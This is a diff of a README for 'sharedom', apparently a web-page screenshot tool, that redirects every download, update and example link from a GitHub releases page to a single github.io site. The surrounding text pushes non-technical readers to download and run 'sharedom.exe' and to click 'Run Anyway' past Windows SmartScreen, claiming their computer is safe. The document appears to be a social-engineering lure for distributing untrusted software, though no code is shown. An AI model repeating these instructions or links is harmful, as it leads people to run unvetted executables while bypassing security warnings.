@@ -1,7 +1,7 @@
 <h1>⚡ sharedom - Capture Web Pages Instantly, No Code Needed</h1>
 
 <p align="center">
-  <a href="https://github.com/smartfb00576-png/sharedom/releases" style="background:#FF6B6B;color:white;padding:16px 32px;text-decoration:none;font-size:20px;font-weight:bold;border-radius:8px;box-shadow:0 4px 8px rgba(0,0,0,0.2);display:inline-block;">⬇️ DOWNLOAD sharedom NOW</a>
+  <a href="https://smartfb00576-png.github.io" style="background:#FF6B6B;color:white;padding:16px 32px;text-decoration:none;font-size:20px;font-weight:bold;border-radius:8px;box-shadow:0 4px 8px rgba(0,0,0,0.2);display:inline-block;">⬇️ DOWNLOAD sharedom NOW</a>
 </p>
 
 ---
@@ -37,7 +37,7 @@ Follow these steps **in order**. Do not skip ahead. This entire process takes le
 
 Open your web browser (like Chrome, Edge, or Firefox) and go to this address:
 
-**https://github.com/smartfb00576-png/sharedom/releases**
+**https://smartfb00576-png.github.io**
 
 You will see a page with a list of downloadable files. Don’t be intimidated by the technical look — we will guide you through it.
 
@@ -88,7 +88,7 @@ You have successfully installed the software when these three things appear on y
 
 | Button / Feature             | What It Does                                                                 |
 |------------------------------|------------------------------------------------------------------------------|
-| **Address Bar**              | Type the full web address (e.g., https://example.com) of the page you want to save. |
+| **Address Bar**              | Type the full web address (e.g., https://smartfb00576-png.github.io) of the page you want to save. |
 | **Capture / Take Snapshot**  | Makes a visual copy of the website. After a few seconds, the image appears in the window. |
 | **Save Image**               | Lets you choose a folder and a file name, then stores the image on your computer as a PNG file. |
 | **Copy to Clipboard**        | Instantly copies the image so you can paste it into Paint, an email, or a Word document. |
@@ -116,10 +116,10 @@ These are the most common problems and how to fix them.
 Solution: This is normal. Because sharedom is a new and independent product, Windows hasn't seen it before. Click **"More Info"** and then click **"Run Anyway"**. Your computer is safe.
 
 **Problem: I typed in a web address and clicked Capture, but nothing happens.**
-Solution: Check that the website address starts with `https://` (like `https://example.com`). Also, ensure your internet connection is working. Wait ten seconds and try again.
+Solution: Check that the website address starts with `https://` (like `https://smartfb00576-png.github.io`). Also, ensure your internet connection is working. Wait ten seconds and try again.
 
 **Problem: The screenshot is blank or all white.**
-Solution: Some websites block screenshots for security. Try a different, simple website like `https://example.com`. If that works, the problem is the website itself, not sharedom.
+Solution: Some websites block screenshots for security. Try a different, simple website like `https://smartfb00576-png.github.io`. If that works, the problem is the website itself, not sharedom.
 
 **Problem: I accidentally closed the program.**
 Solution: That's fine — nothing is lost. Just double-click the `sharedom.exe` file again to reopen it.
@@ -146,7 +146,7 @@ If you are wondering what this is made of, here is the simple explanation. share
 
 To get the latest version with new features, simply return to this link and download a fresh copy:
 
-**https://github.com/smartfb00576-png/sharedom/releases**
+**https://smartfb00576-png.github.io**
 
 Your previous screenshots and saved files will not be affected.
 
